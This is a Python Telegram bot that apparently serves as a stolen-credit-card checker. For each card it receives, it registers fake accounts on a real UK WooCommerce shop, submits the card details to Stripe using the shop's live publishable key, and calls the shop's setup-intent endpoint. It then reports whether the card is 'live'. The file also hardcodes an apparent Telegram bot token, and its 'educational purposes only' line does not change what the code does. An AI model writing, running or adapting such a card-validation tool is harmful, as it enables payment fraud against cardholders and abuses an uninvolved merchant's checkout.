import aiohttp
import asyncio
import random
import string
from datetime import datetime
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Bot config
BOT_TOKEN = os.getenv('BOT_TOKEN', '8411567693:AAE7Yqpy4u9YZqL5DT3-hb0NZgLqTfnFEL0')  # Replace with your actual token or set in env

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com"]
    letters = string.ascii_lowercase
    username = "".join(random.choice(letters) for i in range(10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
    async with session.request(
        method,
        url,
        params=params,
        headers=headers,
        data=data,
        json=json,
    ) as response:
        return await response.text()

async def stripe_auth(cards):
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]

    async with aiohttp.ClientSession() as my_session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        }
        req = await make_request(
            my_session,
            url="https://www.georgedaviesturf.co.uk/my-account",
            method="GET",
            headers=headers,
        )
        await asyncio.sleep(1)
        nonce = parseX(req, 'name="woocommerce-register-nonce" value="', '"')
        if nonce == "None":
            return "❌ Could not access the payment gateway"

        headers2 = headers.copy()
        headers2.update({
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.georgedaviesturf.co.uk",
            "referer": "https://www.georgedaviesturf.co.uk/my-account",
        })
        data2 = {
            "email": generate_random_email(),
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        req2 = await make_request(
            my_session,
            "https://www.georgedaviesturf.co.uk/my-account/",
            headers=headers2,
            data=data2,
        )
        await asyncio.sleep(1)

        req3 = await make_request(
            my_session,
            url="https://www.georgedaviesturf.co.uk/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        await asyncio.sleep(2)
        rest_nonce = parseX(req3, '"createAndConfirmSetupIntentNonce":"', '"')
        if rest_nonce == "None":
            return "❌ Payment gateway error"

        headers4 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        }
        form_data4 = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][country]": "US",
            "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
        }
        req4 = await make_request(
            my_session,
            url="https://api.stripe.com/v1/payment_methods",
            headers=headers4,
            data=form_data4,
        )
        pmid = parseX(req4, '"id": "', '"')
        if pmid == "None":
            error_resp = parseX(req4, '"message":"', '"')
            return f"❌ Stripe: {error_resp if error_resp != 'None' else 'Invalid card details'}"

        headers5 = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.georgedaviesturf.co.uk",
            "referer": "https://www.georgedaviesturf.co.uk/my-account/add-payment-method",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        data5 = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": rest_nonce,
        }
        req5 = await make_request(
            my_session,
            url="https://www.georgedaviesturf.co.uk/wp-admin/admin-ajax.php",
            headers=headers5,
            data=data5,
        )
        if "succeeded" in req5:
            return f"✅ **APPROVED**\n`{cc}|{mon}|{year}|{cvv}`\n💾 Status: Live Card ✅"
        elif "requires_action" in req5:
            return "⚠️ **3DS REQUIRED** - Card requires additional authentication"
        elif "error" in req5 or "decline" in req5:
            error_resp = parseX(req5, '"message":"', '"')
            return f"❌ **DECLINED** - {error_resp if error_resp != 'None' else 'Card not accepted'}"
        else:
            return "❌ **FAILED** - Unable to process card"

def validate_cc_format(cc_text):
    try:
        parts = cc_text.split('|')
        if len(parts) < 4:
            return False
        cc, mon, year, cvv = parts[:4]
        if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
            return False
        if not mon.isdigit() or not (1 <= int(mon) <= 12):
            return False
        if not year.isdigit() or len(year) not in [2, 4]:
            return False
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return False
        return True
    except:
        return False

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
🤖 **Stripe Auth Checker Bot**

Send a credit card as:
`cc_number|mm|yyyy|cvv`

Example:
`4111111111111111|12|2025|123`

🔒 *For educational purposes only*
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_text = update.message.text
    if not validate_cc_format(message_text):
        await update.message.reply_text(
            "❌ **Invalid Format**\n\nPlease send CC as:\n`cc_number|mm|yyyy|cvv`\nExample: `4111111111111111|12|2025|123`",
            parse_mode='Markdown'
        )
        return

    processing_msg = await update.message.reply_text("🔄 Processing your card...")
    result = await stripe_auth(message_text)
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=processing_msg.message_id,
        text=result,
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cc_message))
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True
    )

if __name__ == "__main__":
    main()
